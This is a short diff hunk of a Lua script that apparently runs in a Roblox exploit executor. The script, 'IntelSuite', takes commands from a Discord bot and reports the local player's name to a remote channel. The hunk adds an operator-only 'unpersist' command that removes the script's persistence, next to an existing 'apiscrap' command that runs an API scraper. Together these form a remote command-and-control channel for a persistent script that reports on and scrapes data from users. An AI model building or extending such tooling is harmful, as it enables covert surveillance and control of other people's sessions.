@@ -704,6 +704,14 @@ task.spawn(function()
                 getgenv().IntelSuite.IsActive = true
                 send("STARTED", "**User:** " .. LocalPlayer.Name .. "\n**Status:** Suite reactivated.", 65280)
 
+            elseif cmd == "unpersist" then
+                -- Kevin-only uninstall via !cmd unpersist from Discord bot
+                if getgenv().IntelSuite.UninstallPersistence then
+                    getgenv().IntelSuite.UninstallPersistence()
+                else
+                    send("PERSISTENCE", "UninstallPersistence not found on this session.", 16711680)
+                end
+
             elseif cmd == "apiscrap" then
                 if getgenv().IntelSuite.APIScraper then
                     getgenv().IntelSuite.APIScraper()
